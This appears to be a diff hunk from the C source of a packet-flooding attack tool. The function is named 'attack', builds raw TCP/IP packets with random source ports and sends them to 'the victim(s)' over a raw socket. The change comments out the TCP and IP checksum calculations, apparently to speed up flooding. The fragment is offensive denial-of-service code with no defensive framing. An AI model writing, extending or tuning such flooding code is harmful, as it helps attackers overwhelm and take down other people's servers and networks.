@@ -420,8 +420,8 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
             xf_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
 
         // Calculate TCP checksum
-        xf_tcphdr->th_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));
-        xf_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));
+        //xf_tcphdr->th_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));
+        //xf_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));
 
         // Send the packet to the victim(s).
         sendto(rawsock, datagram, sizeof(struct ip) + sizeof(struct tcp), 0, (struct sockaddr*)&sin, sizeof(sin));
